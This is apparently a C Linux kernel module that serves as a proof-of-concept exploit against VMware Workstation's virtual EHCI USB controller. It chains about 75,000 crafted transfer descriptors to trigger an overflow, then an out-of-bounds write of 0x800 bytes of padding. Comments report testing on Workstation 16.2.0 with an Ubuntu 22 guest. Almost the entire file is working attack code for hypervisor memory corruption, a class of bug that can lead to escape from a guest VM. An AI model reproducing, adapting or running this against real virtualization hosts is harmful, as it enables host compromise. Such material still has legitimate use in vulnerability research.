
#include <linux/module.h>
#include <asm/io.h>
#include <linux/device.h>
#include <linux/pci.h>
#include <linux/virtio.h>
#include <uapi/linux/virtio_ids.h>
#include <linux/types.h>
#include<linux/gfp.h>

// qh->field4 need to be set.
// test on windows vmware workstation 16.2.0, with guest os ubuntu server 22


#define MY_ALIGN(n, m) ((n+m-1)&~(m-1))


static void free_page_below_4gb(void *mem,size_t size) {
    free_pages_exact(mem,size);
}

// should not use too big size
static void * alloc_pages_below_4gb(size_t size) {
    uint64_t mem_paddr = 0;
    uint8_t * mem = NULL;
    while (1) {
        mem = alloc_pages_exact(size,GFP_ATOMIC|__GFP_ZERO);
        if (!mem)
            continue;
         mem_paddr = (uint64_t)virt_to_phys(mem);
        if (mem_paddr < 0xffffffff)
            return mem;
        free_pages_exact(mem,size);
    }
}




/*====================================================Main Loop=============================================================*/



#define EHCI_VENDOR_ID 0x15ad
#define EHCI_DEVICE_ID 0x0770

#define EHCI_DATA_MEM_POOL 4*1024*1024


typedef struct {
    uint64_t field0;
    uint32_t field8;
    uint32_t field12;
    uint64_t field16;
    uint32_t field24;
    uint32_t field28;
}qtd_desc_struct;

typedef struct {
    uint32_t field0;
    uint32_t field4;
    uint32_t field8;
    uint32_t field12;
    qtd_desc_struct qtd;
    // uint64_t field16; // QTD from here
    // uint64_t field24;
    // uint64_t field32;
    // uint64_t field40;
}qh_desc_struct;


// 32 offset High dword
// 40 offset Low dword



static int main_loop(struct pci_dev *pdev){

    uint8_t * mmio_mem = NULL;
    uint64_t mmio_size = 0;
    
    uint8_t * data_mem = NULL;
    
    qh_desc_struct * qh_desc = NULL;
    uint8_t * qtd_list_mem = NULL;
    qtd_desc_struct * qtd_desc = NULL;

    uint64_t overflow_qtd_times = 0;

    uint8_t * pad_mem = NULL;
	
    printk(KERN_ALERT "[%s]: enter main loop\n",__func__);

    mmio_mem = (uint8_t *)pci_ioremap_bar(pdev, 0);
    mmio_size = pci_resource_len(pdev, 0);
    printk(KERN_ALERT "[%s]: ehci mmio_mem: %llx, mmio_size: %llx\n",__func__,(uint64_t)mmio_mem,(uint64_t)mmio_size);

    data_mem = alloc_pages_below_4gb(EHCI_DATA_MEM_POOL);
    memset(data_mem,0,EHCI_DATA_MEM_POOL);
    data_mem = (uint8_t *)MY_ALIGN((uint64_t)data_mem,32);

    printk(KERN_ALERT "[%s]: ehci data_mem vaddr: %llx paddr: %llx\n",__func__,(uint64_t)data_mem,(uint64_t)virt_to_phys(data_mem));
    
    *(uint32_t *)(mmio_mem+16) = 0;

    qh_desc = (qh_desc_struct *)data_mem;
    qh_desc->field0 = (uint64_t)virt_to_phys(qh_desc) & 0xffffffff;
    // set b8 array index
    // not sure the relationship between index and usb bus id, or device id
    // simply test show that this can be set with a device id which device is on the bus 001
    qh_desc->field4 = 2; 
    // set the qtd phyaddr
    qh_desc->field12 = 0;

    // byte1 for switch case and index
    // case 2 for alloc urb packet
    // 1 set phyaddr to field 32

    qh_desc->qtd.field8 = (2 << 8) | (1 << 12);
    qh_desc->qtd.field8 = (0x8 << 16) | qh_desc->qtd.field8;
    qh_desc->qtd.field8 = 0x80 | qh_desc->qtd.field8;

    qh_desc->qtd.field16 = (uint64_t)virt_to_phys((void *)(qh_desc+1)) & 0xffffffff;

    // write buffer will be 0x10 + 0x8 = 0x18

    *(uint64_t *)(qh_desc+1) = ((uint64_t)0x10 << 48) | 0x80;

    qtd_list_mem = (uint8_t *)MY_ALIGN((uint64_t)(qh_desc+1)+sizeof(uint64_t),32);

    qtd_desc = (qtd_desc_struct *)qtd_list_mem;

    // qtd mem phyaddr, 0 for exit
    qh_desc->qtd.field0 = (uint64_t)virt_to_phys((void *)qtd_desc) & 0xffffffff;

    printk(KERN_ALERT "[%s]: ehci qtd_list_mem vaddr: %llx, paddr: %llx\n",__func__,(uint64_t)qtd_list_mem,(uint64_t)virt_to_phys(qtd_list_mem));

    // triggle overflow

    overflow_qtd_times = 74900;

    while (overflow_qtd_times--) {

            qtd_desc->field0 = (uint64_t)virt_to_phys(qtd_desc + 1) & 0xffffffff;
            qtd_desc->field8 = (1 << 8) | (uint8_t)(-1);
            qtd_desc->field8 = (0x7000 << 16) | qtd_desc->field8;
            qtd_desc = qtd_desc + 1;
    }

    // trigle out of bound write
    qtd_desc->field0 = 1; // stop it
    qtd_desc->field8 = (0 << 8) | (uint8_t)(-1);
    // write size 0x800
    qtd_desc->field8 = (0x800 << 16) | qtd_desc->field8;
    // page num index
    qtd_desc->field8 = (0x3 << 12) | qtd_desc->field8;
    // page inside offset
    qtd_desc->field12 = 0;

    pad_mem = (uint8_t *)MY_ALIGN((uint64_t)(qtd_desc+1),0x1000);
    memset(pad_mem,'A',0x800);
    // page num
    qtd_desc->field24 = (uint64_t)virt_to_phys(pad_mem) & 0xffffffff;


    *(uint32_t *)(mmio_mem+32) = (uint64_t)virt_to_phys(qh_desc) >> 32;
    *(uint32_t *)(mmio_mem+40) = (uint64_t)virt_to_phys(qh_desc) & 0xffffffff;

    // *(uint32_t *)(mmio_mem+16) = 0x61;
    *(uint32_t *)(mmio_mem+16) = 0x61;
    
    
    *(uint32_t *)(mmio_mem+16) = 0;
    free_page_below_4gb(data_mem,EHCI_DATA_MEM_POOL);
    printk(KERN_ALERT "[%s]: exit main loop\n",__func__);
	return 0;
}


/*====================================Linux Module Register==========================================================*/

static int pci_module_init(void) {
    
    struct pci_dev *pdev = NULL;
    pdev = pci_get_device(EHCI_VENDOR_ID,EHCI_DEVICE_ID,NULL);
    if(!pdev){
        printk(KERN_ALERT "[%s]: fail to find pdev\n",__func__);
    }
    // %p output will be hashed
    printk(KERN_ALERT "[%s]: find pdev %llx\n",__func__,(uint64_t)pdev);
    main_loop(pdev);
    return 0;
}

static void pci_module_exit(void) {
    printk(KERN_ALERT "[%s]: module exit\n",__func__);
}


MODULE_LICENSE("GPL");

module_init(pci_module_init);
module_exit(pci_module_exit);
